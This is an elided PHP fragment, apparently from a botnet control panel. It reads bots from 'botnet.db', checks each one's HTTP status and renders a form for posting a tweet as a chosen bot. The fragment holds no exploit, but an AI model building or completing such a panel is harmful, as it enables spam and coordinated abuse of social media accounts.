...
foreach(file('./botnet.db') as $bot) {
	...
	if($okay == "HTTP/1.1 200 OK" | $okay == "HTTP/1.0 200 OK") {
		...
		echo "<tr><td style=\"background-color:$color\">$username</td>
			...
			<td style=\"background-color:$color\"><form method=\"post\" action=\"./doit.php\"><input type=\"text\" name=\"tweet\" /><input type=\"hidden\" name=\"botid\" value=\"$count\" /><input type=\"submit\" value=\"Tweet\" /></form></td></tr>";
	} else {
